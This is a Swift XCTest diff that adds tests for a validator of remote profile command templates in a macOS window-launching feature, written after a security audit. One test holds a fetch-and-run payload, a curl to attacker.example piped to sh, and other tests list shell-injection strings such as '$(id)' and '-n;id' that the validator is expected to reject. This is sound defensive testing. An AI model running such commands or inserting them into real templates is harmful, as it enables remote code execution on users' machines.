@@ -59,4 +59,42 @@ final class NewWindowCommandBuilderTests: XCTestCase {
                            "The New Window command may not contain control characters.", template.debugDescription)
         }
     }
+
+    // MARK: Remote profile templates (security audit C1)
+
+    func testProfileTemplateRejectsTheAuditPayload() {
+        let payload = #"/bin/sh -c curl${IFS}-fsSL${IFS}https://attacker.example/p|sh"#
+        XCTAssertNotNil(NewWindowCommandBuilder.profileValidationMessage(for: payload))
+        // The looser user-typed check still lets a user run what they like.
+        XCTAssertNil(NewWindowCommandBuilder.validationMessage(for: payload))
+    }
+
+    func testProfileTemplateRejectsOtherPrograms() {
+        for template in ["/bin/sh -c id", "open -na {target}", "/usr/bin/env open {target}", "{bundleId} -n",
+                         "/usr/bin/open2 {target}", "/Applications/X.app/Contents/MacOS/X"] {
+            XCTAssertNotNil(NewWindowCommandBuilder.profileValidationMessage(for: template), template)
+        }
+    }
+
+    func testProfileTemplateRejectsShellMetacharactersAndLooseTokens() {
+        for tail in ["-n;id", "-n|sh", "-n&id", "$(id)", "`id`", "'x'", "\"x\"", "-n$IFS", "{other}", "/tmp/x", "plain",
+                     "--args=$HOME", "-", "--", "--user-data-dir=/tmp/x", "-profile", "--no-sandbox", "-p"] {
+            XCTAssertNotNil(NewWindowCommandBuilder.profileValidationMessage(for: "/usr/bin/open \(tail)"), tail)
+            XCTAssertNotNil(NewWindowCommandBuilder.profileValidationMessage(for: "{target} \(tail)"), tail)
+        }
+    }
+
+    func testProfileTemplateAcceptsTheDocumentedShapes() {
+        for template in ["/usr/bin/open -na {target} --args --new-window", "{target} --new-window",
+                         "/usr/bin/open -b {bundleId} -n", "{target} --some-flag=a:b/c.d_e-f", "", "   "] {
+            XCTAssertNil(NewWindowCommandBuilder.profileValidationMessage(for: template), template)
+        }
+        XCTAssertNil(NewWindowCommandBuilder.profileValidationMessage(for: nil))
+    }
+
+    func testProfileTemplateKeepsTheBaseChecks() {
+        XCTAssertNotNil(NewWindowCommandBuilder.profileValidationMessage(for: "{target}\u{7}"))
+        XCTAssertNotNil(NewWindowCommandBuilder.profileValidationMessage(
+            for: "{target} " + String(repeating: "a", count: NewWindowCommandBuilder.maximumLength)))
+    }
 }
